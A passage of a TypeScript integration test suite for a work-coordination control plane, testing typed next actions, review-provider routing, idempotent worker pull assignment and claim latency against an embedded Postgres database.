import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import EmbeddedPostgres from 'embedded-postgres';
import { Store } from '../src/store.js';
import { Engine } from '../src/engine.js';
import { server } from '../src/server.js';
import { evaluate, type Observation, type Principal, type Work } from '../src/model.js';
import { actionClaimMs, claimAction, idleActionable, openActions, queueSnapshot, reconcileActions, settleAction, type ActionRow } from '../src/model/actions.js';
import { actionAccount, actionJudgment, executorRunnableKinds, llmRoles, mechanicalActionKinds, nextAction, nextActionKinds, nextActionLlmRoles, refusalAction, type NextActionKind } from '../src/model/next-action.js';
import { agentRequestLimit, agentRequestTypes, deciderFor, humanDecisions, leaseHeldRequestTypes, openAgentRequests, requestResolutionRefusal } from '../src/model/agent-requests.js';
import { reconcileAutoDispatch, reviewNeed } from '../src/model/dispatch.js';
import { reviewProviders } from '../src/model/review.js';
import { attachCommand, runningSessions, sessionHandleLimit, sessionSummary } from '../src/model/sessions.js';
import { pipelineSpeedSummary, speedTarget } from '../src/pipeline-speed.js';
import { dispatchEffects, launchedSessionHandle, runDispatchTick, runWorkerPull, workerPullIntervalMs, emptyDispatchCursor, type DispatchEffects } from '../src/auto-dispatch.js';
import { runCycle, emptyDaemonState, type DaemonEffects } from '../src/master-daemon.js';
import { masterConfigSchema } from '../src/master.js';
import { temporaryDirectory } from './helpers/temp-dirs.js';
import { deliverThroughLedger } from './helpers/ledger-delivery.js';
// @ts-expect-error Dependency-free worker entry point.
import { pullOnce, transportRetries } from '../scripts/graphyard-pull.mjs';
import { agentRequestAttention, agentRequestReport, actionReport, sessionReport } from '../src/cli/master-status.js';
import { pipelineBackfillState, resetPipelineBackfillState } from '../src/pipeline-backfill.js';
import { coordinationViewHeader } from '../src/server/work-view.js';
import WorkDetails from '../web/pages/work-details.js';
// Time-bomb allowance (GY-1694): the 2026-09-01 boundAt is reviewer config and the 2026-09-20 `at`/clock is the fixed now handed to reconcileActions and evaluate; Date.now() serves only the live engine tests.

/**
 * GY-87: coordination inverted. The control plane computes a typed next action per item and keeps a
 * durable row per outstanding action; the loop's own steps do the work (GY-1984).
 *
 * Each test that produces a proof is named for it, so acceptance evidence maps to one executed
 * case per proof: integration:typed-next-action,
 * integration:worker-pull-model (integration:multi-executor-throughput went with the merge
 * request in GY-1235: GitHub merges),
 * integration:no-llm-in-critical-path, integration:typed-agent-requests and
 * integration:session-handles-visible.
 *
 * No test here runs a master session; `runCycle` and `runDispatchTick` appear only where what the
 * loop records about a session is the subject.
 */

const operator: Principal = { id: 'operator', role: 'admin', sessionKind: 'human' };
const worker: Principal = { id: 'agent-a', role: 'worker', runtime: 'claude' };
const otherWorker: Principal = { id: 'agent-b', role: 'worker', runtime: 'cursor' };
const executorA: Principal = { id: 'executor-a', role: 'coordinator' };
const executorB: Principal = { id: 'executor-b', role: 'coordinator' };
const producer: Principal = { id: 'ci-runner', role: 'producer', proofs: ['integration:inverted-loop'] };
const PROOF = 'integration:inverted-loop';
const head = 'a'.repeat(40), base = 'b'.repeat(40), mergeSha = 'c'.repeat(40);
const sha40 = (label: string) => label.replace(/[^a-f0-9]/g, '0').padEnd(40, 'f').slice(0, 40);

let database: EmbeddedPostgres, store: Store, engine: Engine;
let http: ReturnType<typeof server>, url: string;
before(async () => {
  // An offset no other file takes: test files run side by side, and two that share a port fail
  // whichever starts its Postgres second, in its `before` hook, with no reason given.
  const port = Number(process.env.GRAPHYARD_ACTION_QUEUE_TEST_PORT ?? Number(process.env.GRAPHYARD_TEST_PORT ?? 15438) + 71);
  database = new EmbeddedPostgres({ databaseDir: await temporaryDirectory('action-queue'), user: 'graphyard', password: 'testing-only', port, persistent: false, onLog: () => {}, onError: () => {}, postgresFlags: ['-h', '127.0.0.1'] });
  await database.initialise(); await database.start(); await database.createDatabase('graphyard_test');
  store = new Store(`postgres://graphyard:testing-only@127.0.0.1:${port}/graphyard_test`); await store.init();
  engine = new Engine(store, 120, 'owner/project');
  engine.principals = [operator, worker, otherWorker, executorA, executorB, producer];
  http = server(engine, [{ ...operator, token: 'o'.repeat(32) }, { ...worker, token: 'w'.repeat(32) }, { ...executorA, token: 'x'.repeat(32) }]);
  await new Promise<void>(resolve => http.listen(0, '127.0.0.1', resolve));
  url = `http://127.0.0.1:${(http.address() as any).port}`;
});
after(async () => { if (http) await new Promise<void>(resolve => http.close(() => resolve())); if (store) await store.close(); if (database) await database.stop(); });

const reload = async (item: Work | string) => (await store.list()).find(entry => entry.id === (typeof item === 'string' ? item : item.id))!;
const events = async (item: Work, kind: string) => (await store.events(item.id)).filter(event => event.kind === kind).reverse();
const rows = (item: Work) => item.actionQueue?.actions ?? [];
/** The computed action's inputs, untyped at the call site so one assertion cannot narrow the next. */
const inputs = (item: Work): any => item.nextAction!.inputs;
const groupBy = <T>(entries: T[], key: (entry: T) => string) => entries.reduce<Record<string, T[]>>((groups, entry) => { (groups[key(entry)] ??= []).push(entry); return groups; }, {});
const row = (item: Work) => rows(item)[0];
/** A lease that lapsed: the document as it stands between the expiry and the reconciliation that clears it. */
const expireLease = (item: Work) => store.pool.query("UPDATE work_items SET document=jsonb_set(document,'{lease,expiresAt}',to_jsonb($2::text)) WHERE id=$1", [item.id, new Date(Date.now() - 60_000).toISOString()]);

let sequence = 0;
async function created(overrides: Record<string, unknown> = {}) {
  const item = await engine.execute(operator, 'create', null, { title: `Inverted loop ${++sequence}`, criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], ...overrides }, randomUUID());
  return item;
}
const release = async (item: Work) => engine.execute(operator, 'ready', item.id, {}, randomUUID());
async function submitted(actor: Principal = worker) {
  let item = await release(await created());
  item = await engine.execute(actor, 'claim', item.id, {}, randomUUID());
  item = await engine.execute(actor, 'workspace', item.id, { epoch: item.epoch, host: 'machine-a', path: `/tmp/inverted/${item.id}`, branch: `graphyard/${item.key.toLowerCase()}-${item.epoch}` }, randomUUID());
  return engine.execute(actor, 'submit', item.id, { epoch: item.epoch, pr: Number(item.key.slice(3)) }, randomUUID());
}
/** The provider's view of a candidate: approved, both checks green, mergeable and protected. */
function observation(item: Work, overrides: Partial<Observation> = {}): Observation {
  return {
    clockOffset: { min: 0, max: 0 },
    candidate: { sha: head, baseSha: base, pr: item.submission!.pr, branch: item.workspaces.at(-1)!.branch, author: 'implementer' },
    checks: [{ name: 'test', result: 'success', appId: 15368 }, { name: 'typecheck', result: 'success', appId: 15368 }],
    reviews: [{ reviewer: 'reviewer', sha: head, state: 'APPROVED' }], protected: true, mergeable: true,
    merged: false, mergeSha: null, files: ['src/loop.ts'], scopeFiles: [], at: new Date().toISOString(),
    prState: 'open', draft: false, baseTip: base, baseTree: sha40('7e'), baseTipContained: true, ...overrides,
  };
}
// ---- AC-1: the control plane computes a typed next action ------------------------------------

test('integration:typed-next-action — the control plane names one typed action per open item, with the inputs it needs, and every gate refusal maps to exactly one action or to escalate', async () => {
  // Backlog is not open work: an unreleased item raises no action at all, though its refusal
  // still maps to one — releasing it is the operator's call about what to work on.
  let item = await created();
  assert.equal(item.nextAction, null);
  assert.deepEqual(item.actionQueue!.actions, []);
  assert.equal(refusalAction(item, 'ready', 'Not released from backlog'), 'escalate');

  // Ready and unassigned: a dispatch, carrying what a launcher needs to choose a profile.
  item = await release(item);
  assert.equal(item.nextAction!.kind, 'dispatch');
  assert.deepEqual(inputs(item), { kind: 'dispatch', target: 'implementation', epoch: 0, priority: 2 });
  assert.equal(item.nextAction!.llmRole, 'implement');
  assert.equal(item.nextAction!.work, item.id); assert.equal(item.nextAction!.key, item.key);

  // Claimed: a session is already doing exactly what the build gate waits for, so nothing is named.
  item = await engine.execute(worker, 'claim', item.id, {}, randomUUID());
  assert.equal(item.nextAction, null, 'a live lease is not a second dispatch');

  // Submitted but never observed: the control plane must read the pull request before anything else.
  item = await engine.execute(worker, 'workspace', item.id, { epoch: 1, host: 'machine-a', path: `/tmp/inverted/${item.id}`, branch: `graphyard/${item.key.toLowerCase()}-1` }, randomUUID());
  item = await engine.execute(worker, 'submit', item.id, { epoch: 1, pr: Number(item.key.slice(3)) }, randomUUID());
  assert.equal(item.nextAction!.kind, 'resync');
  assert.equal(inputs(item).pr, item.submission!.pr);

  // Observed and without an approval: the review request, bound to the exact head, base and policy.
  // No proof holds it (GY-1235): unit tests run in CI and e2e in UAT, so the reviewer is asked at once.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [] }));
  assert.equal(item.nextAction!.kind, 'request-review');
  assert.deepEqual(inputs(item), { kind: 'request-review', provider: 'github', requestId: item.autoDispatch!.review!.id, pr: item.submission!.pr, sha: head, baseSha: base, policyRevision: 1 });
  assert.equal(item.autoDispatch!.producers.length, 0, 'and no producer is asked for a proof');
  assert.equal(item.nextAction!.llmRole, 'review');

  // A reviewer that requested changes on this exact head: no review can be asked for it again, so
  // the item is named as owing a new head. Naming `request-review` here is the silence AC-1 ends —
  // no review request stands, so no executor could ever complete the action it was handed.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [{ reviewer: 'reviewer', sha: head, state: 'CHANGES_REQUESTED' }] }));
  assert.equal(item.nextAction!.kind, 'request-rework');
  assert.equal(item.nextAction!.gate, 'review');
  assert.equal(item.nextAction!.llmRole, 'approve-decision', 'a new head is a judgment owed, not a step an executor runs');
  assert.match(inputs(item).detail, /reviewer requested changes on [0-9a-f]{12}; the next head is reviewed afresh/);
  assert.equal(item.autoDispatch!.review, null, 'and the control plane asks nobody to review a head nobody may review');
  assert.equal(refusalAction(item, 'review', item.nextAction!.refusal!), 'request-rework', 'the refusal maps there too, so the queue and the gate agree');

  // A head that does not contain the base tip and conflicts with it (GY-191: behind alone is
  // reviewed as it stands) is answered by a fresh reading and a sync, not a review.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [], baseTipContained: false, baseTip: sha40('ef'), mergeable: false, conflicting: true }));
  assert.equal(item.nextAction!.kind, 'resync');
  assert.equal(item.nextAction!.gate, 'review');
  assert.match(item.nextAction!.reason, /does not contain the base tip [0-9a-f]{12}/);

  // A base the control plane could not merge in cleanly is the same shape of mistake the other
  // way: the refusal itself says to resolve it and push, and that the approval and proofs bound to
  // this head do not survive the resolution. A re-read cannot produce that head, so the item owes
  // a new one — otherwise the row completes, waits ten minutes, reopens and repeats forever.
  const conflict = `Candidate ${head.slice(0, 12)} cannot be brought onto base branch tip ${sha40('ef').slice(0, 12)} without resolving a conflict, which is content nobody reviewed or proved: merge conflict in src/loop.ts. Run graphyard sync ${item.key}, resolve it and push; the approval and proofs bound to ${head.slice(0, 12)} do not survive the resolution.`;
  const conflicted = { ...structuredClone(await reload(item)), lease: null,
    baseRefresh: { from: { sha: head, baseSha: base }, base: sha40('ef'), baseTree: sha40('7e'), policyRevision: 1, at: new Date().toISOString(), head: null, conflict, carry: null } } as unknown as Work;
  Object.assign(conflicted, evaluate(conflicted, [conflicted], new Date()));
  const conflictAction = nextAction(conflicted, [conflicted], new Date())!;
  assert.equal(conflictAction.gate, 'build');
  assert.equal(conflictAction.refusal, conflict);
  assert.equal(conflictAction.kind, 'request-rework', 'a conflict the control plane cannot resolve needs a new head, not a re-read');
  assert.equal(refusalAction(conflicted, 'build', conflict), 'request-rework');
  assert.match((conflictAction.inputs as any).detail, new RegExp(`Run graphyard sync ${item.key}, resolve it and push`), 'and the detail carries the instruction the worker follows');

  // The same mistake, one provider over. A `codex` or `agent` review is dispatched by the control
  // plane's own durable observation job and never by a session an executor launches, so
  // `reviewNeed` raises no review request for those providers — and naming `request-review` there
  // handed an executor a row nothing could settle: no request stands, the handler refuses for want
  // of one, and the row fails, backs off to the retry cap and is claimed again every tick forever
  // while the item is never shown as owing a judgment. Every provider the policy supports is
  // therefore named an action an executor can carry to completion, or an escalation where only an
  // operator can act — never one that cannot succeed.
  const reviewable = await reload(item);
  const providerProbe = (policy: Record<string, unknown>, overrides: Partial<Work> = {}) => {
    const probe = { ...structuredClone(reviewable), lease: null, policy: { ...reviewable.policy, ...policy },
      observation: observation(reviewable, { reviews: [], baseTipContained: true, baseTip: base }), ...structuredClone(overrides) } as unknown as Work;
    Object.assign(probe, evaluate(probe, [probe], new Date()));
    return probe;
  };
  const claude = { name: 'claude', runtime: 'claude', reviewerApp: 'claude-app', timeoutSeconds: 1800 };
  const answerable: NextActionKind[] = [...executorRunnableKinds, 'escalate'];
  for (const provider of reviewProviders) {
    const probe = providerProbe(provider === 'agent' ? { reviewProvider: provider, reviewerProfiles: [claude] } : { reviewProvider: provider });
    const action = nextAction(probe, [probe], new Date())!;
    assert.equal(action.gate, 'review', `${provider}: the review gate is the one refusing`);
    assert.ok(answerable.includes(action.kind), `${provider}: ${action.kind} is an action an executor runs or an escalation, not one nothing can complete`);
    assert.equal(refusalAction(probe, 'review', action.refusal!), action.kind, `${provider}: the refusal maps to the same kind, so the queue and the gate agree`);
    reconcileAutoDispatch(probe, [probe], new Date());
    if (provider === 'github') {
      assert.equal(action.kind, 'request-review', 'a GitHub approval is the one review a launched session answers');
      assert.ok(probe.autoDispatch!.review, 'so a request stands for its handler to find');
      assert.equal((nextAction(probe, [probe], new Date())!.inputs as any).requestId, probe.autoDispatch!.review!.id, 'and the action names it');
    } else {
      assert.equal(action.kind, 'resync', `${provider}: the fresh reading that wakes the observation job is what requests the review and reads its verdict`);
      assert.equal(reviewNeed(probe).needed, false, `${provider}: no launched reviewer is asked for`);
      assert.equal(probe.autoDispatch!.review, null, `${provider}: and none is requested, so no executor could answer a request-review`);
      assert.match(action.reason, new RegExp(`control plane dispatches ${provider} review`));
    }
  }

  // An agent policy whose reviewer roster is spent for this candidate has nobody left to ask.
  // Adding reviewer capacity or selecting another provider is the operator's judgment, so it
  // escalates — visible and owed — rather than naming a review or re-reading forever.
  const spent = providerProbe({ reviewProvider: 'agent', reviewerProfiles: [claude] }, { reviewFailovers: [{ profile: 'claude', reviewerApp: 'claude-app', runtime: 'claude',
    exhaustion: 'usage-limit', reason: 'the reviewer runtime reported a usage limit', at: new Date().toISOString(), sha: head, baseSha: base, policyRevision: 1, requestCommentId: 7, nextProfile: null }] } as Partial<Work>);
  const spentAction = nextAction(spent, [spent], new Date())!;
  assert.equal(spentAction.kind, 'escalate');
  assert.equal(spentAction.gate, 'review');
  assert.equal(spentAction.llmRole, 'resolve-escalation');
  assert.match(spentAction.reason, /no executor step answers it: every configured reviewer profile is exhausted for [0-9a-f]{12} \(claude\)/);
  assert.match((spentAction.inputs as any).detail, /adding reviewer capacity or selecting another review provider is the operator's decision/);
  assert.equal(spentAction.refusal, 'Every configured reviewer profile is exhausted for this candidate (claude); add reviewer capacity or select another review provider', 'and the refusal it classified is carried verbatim');
  assert.equal(refusalAction(spent, 'review', spentAction.refusal!), 'escalate');

  // A change request answers a head under every provider as well: an agent reviewer records its
  // verdict against the dispatched request rather than as a GitHub review, and either way the
  // item owes a new head rather than another review of this one.
  const answered = providerProbe({ reviewProvider: 'codex' });
  answered.observation!.agentReview = { provider: 'codex', sha: head, approved: false, verdict: 'changes-requested', requestId: 11, reason: 'the refusal is still swallowed' };
  Object.assign(answered, evaluate(answered, [answered], new Date()));
  const answeredAction = nextAction(answered, [answered], new Date())!;
  assert.equal(answeredAction.kind, 'request-rework');
  assert.equal(answeredAction.llmRole, 'approve-decision', 'a new head is a judgment owed, not a step an executor runs');
  assert.match((answeredAction.inputs as any).detail, /codex requested changes on [0-9a-f]{12}; the next head is reviewed afresh/);

  // Approved: the merge writer trials and merges it (GY-2010), so nothing is named — the item
  // waits on the writer, and its reconciled record delivers it.
  item = await engine.observe(item.id, item.revision, observation(item, { baseTipContained: true, baseTip: base }));
  assert.equal(item.nextAction, null, 'no executor step merges');
  const merging = actionAccount(item, [item], new Date());
  assert.equal(merging.wait?.kind, 'session'); assert.equal(merging.wait?.on, 'merge-writer');
  assert.match(merging.wait!.detail, new RegExp(`queued for the merge writer, which trials and pushes it: merge writer has not trialled ${head.slice(0, 12)}`));

  // The API exposes both the per-item action and the whole queue.
  const response = await fetch(`${url}/api/actions`, { headers: { Authorization: `Bearer ${'x'.repeat(32)}` } });
  const body = await response.json();
  assert.equal(response.status, 200);
  assert.deepEqual(body.kinds, [...nextActionKinds]);
  assert.deepEqual(body.mechanical, [...mechanicalActionKinds]);
  assert.equal(body.nextActions.some((entry: any) => entry.key === item.key), false, 'a candidate GitHub merges names no action');
  const snapshot = await (await fetch(`${url}/api/work-snapshot`, { headers: { Authorization: `Bearer ${'x'.repeat(32)}` } })).json();
  assert.ok((snapshot.work as Work[]).every(entry => 'nextAction' in entry), 'every item carries its computed action');

  // Totality: every refusal any gate raises across a battery of states maps to exactly one kind.
  const all = await store.list();
  const probes: Work[] = [
    ...all,
    { ...all[0], blocker: 'The staging database is unreachable', gates: [{ name: 'ready', passed: false, reasons: ['The staging database is unreachable'] }] } as Work,
    { ...all[0], gates: [{ name: 'ready', passed: false, reasons: ['Dependency GY-3 is unfinished'] }] } as Work,
    { ...all[0], gates: [{ name: 'build', passed: false, reasons: ['Candidate conflicts with the base branch', 'Mechanical proof unit:priority failed on this head', 'Worker has not submitted implementation for this attempt'] }] } as Work,
    { ...all[0], gates: [{ name: 'test', passed: false, reasons: ['Required check typecheck has not passed on this head'] }] } as Work,
    { ...all[0], gates: [{ name: 'review', passed: false, reasons: ['Outstanding change requests must be resolved through a new review'] }] } as Work,
    { ...all[0], gates: [{ name: 'merge', passed: false, reasons: ['Required Graphyard check and merge-queue branch protection have not been verified'] }] } as Work,
    { ...all[0], gates: [{ name: 'acceptance', passed: false, reasons: [`Trusted ${PROOF} evidence from agent-a is no longer independent: agent-a has since held an assignment on GY-1`] }] } as Work,
  ];
  const seen = new Map<string, NextActionKind>();
  for (const probe of probes) for (const gate of probe.gates) for (const refusal of gate.reasons) {
    const kind = refusalAction(probe, gate.name, refusal);
    assert.ok(nextActionKinds.includes(kind), `${gate.name}: ${refusal} mapped to ${kind}`);
    assert.equal(refusalAction(probe, gate.name, refusal), kind, 'the mapping is a function of its inputs');
    seen.set(`${gate.name}:${refusal}`, kind);
  }
  assert.ok(seen.size >= 10, `the battery covered ${seen.size} distinct refusals`);
  assert.deepEqual([...new Set(probes.flatMap(probe => probe.gates.map(gate => gate.name)))].sort(), ['acceptance', 'build', 'merge', 'ready', 'review', 'test'], 'every gate contributed a refusal');
  // The named mappings, one per gate, and the catch-all that makes the function total.
  assert.equal(refusalAction(all[0], 'ready', 'Not released from backlog'), 'escalate');
  assert.equal(refusalAction(all[0], 'ready', 'Dependency GY-9 is unfinished'), 'dispatch');
  assert.equal(refusalAction(all[0], 'build', 'Worker has not submitted implementation for this attempt'), 'dispatch');
  assert.equal(refusalAction(all[0], 'build', 'Pull request has not been independently observed'), 'resync');
  assert.equal(refusalAction(all[0], 'review', 'Independent approval of the current commit is required'), 'request-review');
  assert.equal(refusalAction(all[0], 'nowhere', 'A refusal nobody has written a rule for yet'), 'escalate', 'an unmapped refusal escalates rather than vanishing');
  // The merge writer's trial and push are its own merge step (GY-2010), whatever GitHub check a pull-request-era observation carries.
  const failing = { ...all[0], observation: { ...observation(item), checks: [{ name: 'test', result: 'failure', appId: 15368 }] } } as Work;
  assert.equal(refusalAction(failing, 'test', `merge writer has not trialled ${head.slice(0, 12)} on ${base.slice(0, 12)}`), 'merge');
  assert.equal(refusalAction(failing, 'merge', `merge writer has not pushed ${head.slice(0, 12)}`), 'merge');
});

// ---- AC-2: durable rows, leased claims, idempotency ------------------------------------------

/** A master configuration with one worker profile per worker, one reviewer profile and one independent producer profile. */
const fleetConfig = masterConfigSchema.parse({
  version: 1, url: 'https://graphyard.example', credentialFile: '/outside/master.token', cliPath: '/outside/graphyard.mjs',
  repository: 'owner/project', baseBranch: 'main', githubAppId: 15368, hostId: 'host-1', masterAgentName: 'm', herdrWorkspace: 'wF',
  workers: [
    { name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' },
    { name: 'cursor-worker', principal: otherWorker.id, agentName: 'work-cursor', mode: 'launch', kind: 'cursor', credentialFile: '/outside/worker-2.token', approvals: 'auto' },
  ],
  reviewer: { appId: 4242, installationId: 99, slug: 'graphyard-reviewer', credentialFile: '/outside/reviewer.json', boundAt: '2026-09-01T00:00:00.000Z' },
  reviewers: [{ name: 'claude-reviewer', agentName: 'review-claude', kind: 'claude', approvals: 'auto' }],
  producers: [{ name: 'claude-producer', principal: producer.id, agentName: 'proof-claude', kind: 'claude', credentialFile: '/outside/producer.token', approvals: 'auto' }],
  run: { reviewerProfile: 'claude-reviewer' },
});

test('integration:worker-pull-model — a free worker asks the control plane for its next assignment, p90 ready-to-claim stays inside two minutes, and nothing tracks runtime health', async () => {
  const offered: Work[] = [];
  for (let index = 0; index < 4; index++) offered.push(await release(await engine.execute(operator, 'create', null, { title: `Pull ${index}`, priority: index === 0 ? 0 : 3, criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID())));

  // The pull: one call, one credential, no configuration. `agent-b` appears in no master profile
  // and no Herdr inventory; the control plane still hands it the work it is entitled to claim.
  const assigned: Work[] = [];
  for (const actor of [worker, otherWorker, worker, otherWorker]) {
    const pulled = await engine.pullAssignment(actor, {}, randomUUID());
    assert.ok(pulled.assigned, 'a free worker that asks is given an assignment');
    assigned.push(pulled.assigned!);
    assert.equal(pulled.assigned!.lease!.owner, actor.id, 'the worker claims under its own identity');
  }
  assert.equal(new Set(assigned.map(item => item.id)).size, assigned.length, 'no item was handed to two workers');
  // The offer order is the dispatch order the control plane already uses: priority first.
  // Nothing about worker liveness enters into it. Earlier tests leave dispatchable items of their
  // own; among this test's items, the highest priority is offered first.
  assert.equal(assigned.filter(item => offered.some(entry => entry.id === item.id))[0].priority, 0, 'the highest priority item is offered first');
  for (const item of assigned) await engine.execute(item.lease!.owner === worker.id ? worker : otherWorker, 'release', item.id, { epoch: item.lease!.epoch }, randomUUID());

  // An item another worker already holds is never offered twice: a racing pull skips it.
  const contested = await release(await engine.execute(operator, 'create', null, { title: 'Contested', criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const [first, second] = await Promise.all([engine.pullAssignment(worker, { work: contested.id }, randomUUID()), engine.pullAssignment(otherWorker, { work: contested.id }, randomUUID())]);
  const winners = [first, second].filter(result => result.assigned);
  assert.equal(winners.length, 1, 'the coordination lock decides the race; the loser is told nothing was left');
  assert.equal(winners[0].assigned!.id, contested.id);
  await engine.execute(winners[0].assigned!.lease!.owner === worker.id ? worker : otherWorker, 'release', contested.id, { epoch: winners[0].assigned!.lease!.epoch }, randomUUID());

  // A pull that timed out after its claim committed is retried with the same key: it replays the
  // claim it already made. Without that the retry would take a second item and the worker would
  // hold a lease it was never told about, until it lapsed into a reclaim.
  const replayable = await release(await engine.execute(operator, 'create', null, { title: 'Replayed pull', criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const alsoOffered = await release(await engine.execute(operator, 'create', null, { title: 'Second offer', criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const retryKey = randomUUID();
  const won = await engine.pullAssignment(worker, {}, retryKey);
  assert.ok(won.assigned, 'the pull claimed an item');
  const heldAfterPull = (await store.list()).filter(entry => entry.lease?.owner === worker.id).map(entry => entry.id).sort();
  const replayed = await engine.pullAssignment(worker, {}, retryKey);
  assert.equal(replayed.assigned!.id, won.assigned!.id, 'the retry returns the assignment the first call made');
  assert.equal((replayed as any).replayed, true);
  const heldAfterRetry = (await store.list()).filter(entry => entry.lease?.owner === worker.id).map(entry => entry.id).sort();
  assert.deepEqual(heldAfterRetry, heldAfterPull, 'the retry took no second item');
  assert.ok(heldAfterPull.includes(won.assigned!.id));
  for (const item of [replayable, alsoOffered]) {
    const current = await reload(item);
    if (current.lease) await engine.execute(worker, 'release', current.id, { epoch: current.lease.epoch }, randomUUID());
  }

  // One key can only ever claim one item, including when the retry races the call it is retrying:
  // the claim and its receipt are written in one transaction, so whichever reaches an offer first
  // wins and the other replays that assignment instead of taking a second.
  const raced = await release(await engine.execute(operator, 'create', null, { title: 'Raced pull', criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const alsoRaced = await release(await engine.execute(operator, 'create', null, { title: 'Raced pull 2', criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID()));
  const racedKey = randomUUID();
  const [one, two] = await Promise.all([engine.pullAssignment(worker, { work: raced.id }, racedKey), engine.pullAssignment(worker, { work: alsoRaced.id }, racedKey)]);
  const assignments = [one, two].filter(result => result.assigned);
  assert.equal(assignments.length, 2, 'both calls answered with the assignment this pull made');
  assert.equal(one.assigned!.id, two.assigned!.id, 'and it is the same one; the key claimed a single item');
  const heldAfterRace = (await store.list()).filter(entry => [raced.id, alsoRaced.id].includes(entry.id) && entry.lease?.owner === worker.id);
  assert.deepEqual(heldAfterRace.map(entry => entry.id), [one.assigned!.id], 'the worker holds exactly the item it was told about, never the other offer as well');
  await engine.execute(worker, 'release', one.assigned!.id, { epoch: heldAfterRace[0].lease!.epoch }, randomUUID());

  // The shipped worker is what makes that replay reachable: one key, held across every transport
  // retry. A retry under a fresh key after a timeout would take a second item instead.
  const keys: string[] = [];
  let attempts = 0;
  const flaky = async (key: string) => {
    keys.push(key);
    if (++attempts < 2) throw Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' });
    return { assigned: { key: 'GY-1' }, offered: 1, refused: [], replayed: true };
  };
  const pulled = await pullOnce(flaky, { backoffMs: 0 });
  assert.equal(pulled.replayed, true, 'the retry got the claim the timed-out call had already made');
  assert.equal(keys.length, 2);
  assert.equal(new Set(keys).size, 1, 'both attempts carried one idempotency key');
  // A server that answered is an answer, retried by nobody.
  let refusals = 0;
  await assert.rejects(pullOnce(async () => { refusals++; throw new Error('Worker permission required'); }, { backoffMs: 0 }), /Worker permission required/);
  assert.equal(refusals, 1);
  assert.ok(transportRetries >= 2);

  // Ready-to-claim, measured: the shipped pull loop (`runWorkerPull`) polls at its interval while
  // items are released under it, and each latency is the time from the item becoming ready to the
  // claim landing. The interval is scaled down so the measurement fits a test; what is measured is
  // that the loop claims within one interval of the work appearing, which is the property the
  // published interval then bounds.
  const pollMs = 100;
  const latencies: number[] = [];
  for (let index = 0; index < 10; index++) {
    const actor = index % 2 ? worker : otherWorker;
    const item = await engine.execute(operator, 'create', null, { title: `Polled ${index}`, criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID());
    // The loop is already polling when the item is released, exactly as an idle session is.
    const loop = runWorkerPull(() => engine.pullAssignment(actor, { work: item.id }, randomUUID()), { intervalMs: pollMs, maxPolls: 300 });
    await release(item);
    const readyAt = Date.now();
    const result = await loop;
    assert.ok(result.assigned, `${item.key} was handed to the polling worker`);
    assert.ok(result.polls >= 1, 'the assignment came from a poll, not from a dispatch');
    latencies.push(Math.max(0, Date.now() - readyAt));
    await engine.execute(actor, 'release', result.assigned!.id, { epoch: result.assigned!.lease!.epoch }, randomUUID());
  }
  const rank = (values: number[], percentile: number) => [...values].sort((a, b) => a - b)[Math.max(0, Math.ceil(values.length * percentile / 100) - 1)];
  const measuredP90 = rank(latencies, 90);
  assert.equal(latencies.length, 10);
  assert.ok(measuredP90 <= 4 * pollMs, `p90 ready-to-claim ${measuredP90}ms is within a few ${pollMs}ms polls`);
  // The same loop at the interval Graphyard ships: one interval, plus the service time just
  // measured above it. Both are inside the two-minute bound the criterion sets.
  const serviceMs = Math.max(0, measuredP90 - pollMs);
  assert.ok(workerPullIntervalMs <= 120_000, `the published poll interval ${workerPullIntervalMs}ms is inside the two-minute bound`);
  assert.ok(workerPullIntervalMs + serviceMs <= 120_000, `p90 ready-to-claim at the shipped interval, ${workerPullIntervalMs + serviceMs}ms, is inside two minutes`);

  // No central runtime-health tracking: the request body carries nothing but an optional host,
  // and the control plane consults no profile registry, credential inspection or session inventory.
  const idle = await engine.pullAssignment(worker, { work: 'GY-nothing-on-offer' }, randomUUID());
  assert.equal(idle.assigned, null);
  assert.equal(idle.offered, 0);
  assert.deepEqual(Object.keys(idle as object).sort(), ['assigned', 'at', 'offered', 'refused']);
});

// ---- AC-5: no language model in the critical path ---------------------------------------------

test('integration:no-llm-in-critical-path — every judgment has one action that starts it, the mechanical kinds need no language model, and an escalation waits for a judgment', async () => {
  // The roles are declared per kind: judgment happens inside what an action starts, never in the
  // step that starts it. Four kinds name a judgment; the other three are mechanical.
  assert.deepEqual(Object.entries(nextActionLlmRoles).filter(([, role]) => role !== null).map(([kind]) => kind).sort(),
    ['dispatch', 'escalate', 'request-review', 'request-rework'].sort());
  assert.deepEqual([...mechanicalActionKinds].sort(), ['merge', 'reclaim', 'resync'].sort());
  assert.deepEqual([...llmRoles].sort(), ['approve-decision', 'implement', 'produce-evidence', 'resolve-escalation', 'review']);
  // Every judgment the project names has exactly one action that starts it, and nothing else does.
  assert.deepEqual([...new Set(Object.values(nextActionLlmRoles))].filter(Boolean).sort(), ['approve-decision', 'implement', 'resolve-escalation', 'review'],
    'produce-evidence is the dispatch of a producer session, which the computed action names on the row');

  // A kind whose judgment happens in the step itself is never mechanical.
  assert.deepEqual([...executorRunnableKinds].sort(), ['dispatch', 'merge', 'reclaim', 'request-review', 'resync'].sort());
  assert.equal(actionJudgment.escalate, 'in-step');
  assert.equal(actionJudgment['request-rework'], 'in-step');

  // An item that does raise an escalation stalls at that row rather than being resolved by the
  // loop: the escalation is outside the critical path, not quietly automated inside it.
  let escalated = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
